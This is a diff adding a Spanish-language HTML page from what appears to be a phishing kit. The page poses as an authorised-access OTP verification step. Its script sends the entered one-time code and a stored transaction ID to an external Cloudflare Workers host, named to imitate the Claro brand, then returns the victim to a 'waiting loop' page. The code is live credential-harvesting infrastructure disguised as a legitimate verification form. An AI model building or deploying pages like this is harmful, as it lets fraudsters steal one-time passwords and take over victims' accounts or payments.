@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Código</title>
+  <style>
+    body {
+      background: #0a0f2c; color: #fff; font-family: Arial;
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
+      height: 100vh; margin: 0;
+    }
+    .box {
+      background: #1b2459; padding: 30px; border-radius: 15px;
+      box-shadow: 0 0 15px #4fc3f7; text-align: center;
+    }
+    input {
+      padding: 10px; margin-top: 15px; border-radius: 8px; border: none; width: 100%;
+    }
+    button {
+      margin-top: 15px; padding: 10px 20px; border: none; border-radius: 8px;
+      background: #4fc3f7; color: #0a0f2c; font-weight: bold; cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>✅ Acceso autorizado</h2>
+    <p>Introduce el código OTP recibido:</p>
+    <input type="text" id="otp" placeholder="Código OTP" />
+    <button onclick="enviarCodigo()">Enviar</button>
+  </div>
+
+  <script>
+    async function enviarCodigo() {
+      const otp = document.getElementById('otp').value.trim();
+      if (!otp) return alert("Debes ingresar el código");
+
+      const transactionId = localStorage.getItem('transactionId');
+      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/otp-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ transactionId, otp })
+      });
+
+      // Vuelve al bucle de espera
+      window.location.href = "cargando.html";
+    }
+  </script>
+</body>
+</html>
